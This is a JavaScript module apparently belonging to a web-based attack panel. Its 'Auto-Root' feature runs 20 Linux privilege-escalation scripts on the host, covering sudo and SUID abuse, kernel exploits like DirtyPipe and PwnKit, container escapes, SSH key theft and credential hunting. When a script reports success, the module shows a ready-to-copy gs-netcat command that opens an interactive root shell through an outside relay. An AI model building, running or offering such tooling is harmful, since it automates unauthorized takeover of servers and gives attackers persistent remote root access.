// DOOZ Auto-Root Module
const {$,api}=window.DOOZ;
let methodResults={};

const LPE_METHODS=[
    {id:'01_sudo',name:'Sudo NOPASSWD',desc:'Check sudo misconfigurations'},
    {id:'02_suid',name:'SUID Binaries',desc:'Find exploitable SUID files'},
    {id:'03_passwd',name:'Writable /etc/passwd',desc:'Direct user injection'},
    {id:'04_docker',name:'Docker Socket',desc:'Container escape'},
    {id:'05_capabilities',name:'Capabilities',desc:'Linux capabilities abuse'},
    {id:'06_kernel',name:'Kernel Exploit',desc:'DirtyPipe, DirtyCOW, PwnKit'},
    {id:'07_cron',name:'Cron Jobs',desc:'Writable cron entries'},
    {id:'08_ldpreload',name:'LD_PRELOAD',desc:'Sudo env_keep'},
    {id:'09_redis',name:'Redis',desc:'Redis misconfig RCE'},
    {id:'10_passwords',name:'Password Hunt',desc:'Hunt credentials'},
    {id:'11_nfs',name:'NFS no_root_squash',desc:'NFS root escalation'},
    {id:'12_path',name:'Writable PATH',desc:'PATH hijacking'},
    {id:'13_dbus',name:'D-Bus',desc:'D-Bus policy exploitation'},
    {id:'14_lxd',name:'LXD/LXC',desc:'Container privilege escape'},
    {id:'15_systemd',name:'Systemd',desc:'Service manipulation'},
    {id:'16_sshkeys',name:'SSH Keys',desc:'Key theft and injection'},
    {id:'17_mysql',name:'MySQL UDF',desc:'User-defined function RCE'},
    {id:'18_tmux',name:'Tmux/Screen',desc:'Session hijacking'},
    {id:'19_pspy',name:'Process Monitor',desc:'Background process discovery'},
    {id:'20_final',name:'Final Checks',desc:'World-writable, SGID, misc'}
];

function initMethodCards(){
    let h='';
    LPE_METHODS.forEach((m,i)=>{
        h+=`<div class="method-card" id="mc-${i}">
            <div class="method-header" onclick="toggleMethod(${i})">
                <span class="method-num">${String(i+1).padStart(2,'0')}</span>
                <span class="method-name">${m.name}<br><small style="color:var(--dim);font-size:10px">${m.desc}</small></span>
                <span class="method-status pending" id="mstat-${i}">pending</span>
                <span class="method-toggle">▼</span>
            </div>
            <div class="method-body">
                <div class="method-output" id="mout-${i}">Click "Run" to execute</div>
                <div class="method-actions">
                    <button class="btn btn-sm" onclick="runSingleMethod(${i})">▶ Run</button>
                </div>
            </div>
        </div>`;
    });
    if($('method-list'))$('method-list').innerHTML=h;
}

function toggleMethod(idx){$('mc-'+idx)?.classList.toggle('expanded');}

async function runSingleMethod(idx){
    const m=LPE_METHODS[idx];
    const card=$('mc-'+idx);
    const stat=$('mstat-'+idx);
    const out=$('mout-'+idx);
    
    card?.classList.add('expanded');
    if(stat){stat.textContent='checking';stat.className='method-status checking';}
    if(out)out.innerHTML='<span style="color:var(--gold)">Running...</span>';
    
    const r=await api('run',{path:'lpe_methods/'+m.id+'.sh'});
    const output=r.output||'No output';
    
    let formatted=output.split('\n').map(line=>{
        if(line.includes('[+]'))return `<span style="color:var(--green)">${line}</span>`;
        if(line.includes('[-]'))return `<span style="color:var(--red)">${line}</span>`;
        if(line.includes('[!]'))return `<span style="color:#f59e0b">${line}</span>`;
        if(line.includes('[*]'))return `<span style="color:var(--gold)">${line}</span>`;
        return line;
    }).join('\n');
    
    if(out)out.innerHTML=`<pre style="margin:0;white-space:pre-wrap">${formatted}</pre>`;
    methodResults[idx]=output;
    
    if(stat){
        if(output.includes('[+]')||output.includes('VULNERABLE')){
            stat.textContent='success';stat.className='method-status success';
        }else if(output.includes('[!]')){
            stat.textContent='partial';stat.className='method-status partial';
        }else{
            stat.textContent='clean';stat.className='method-status failed';
        }
    }
    
    // Check for root success
    if(output.includes('ROOT_SECRET:')){
        const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
        if(match&&$('root-result')){
            $('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT!</h3><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code></div>`;
        }
    }
}

async function runAllMethods(){
    const btn=$('btn-autoroot');
    if(btn){btn.disabled=true;btn.textContent='Running...';}
    for(let i=0;i<LPE_METHODS.length;i++){
        await runSingleMethod(i);
        await new Promise(r=>setTimeout(r,300));
    }
    if(btn){btn.disabled=false;btn.textContent='🚀 Run All';}
}

window.load_root=initMethodCards;
window.initMethodCards=initMethodCards;
window.toggleMethod=toggleMethod;
window.runSingleMethod=runSingleMethod;
window.runAllMethods=runAllMethods;
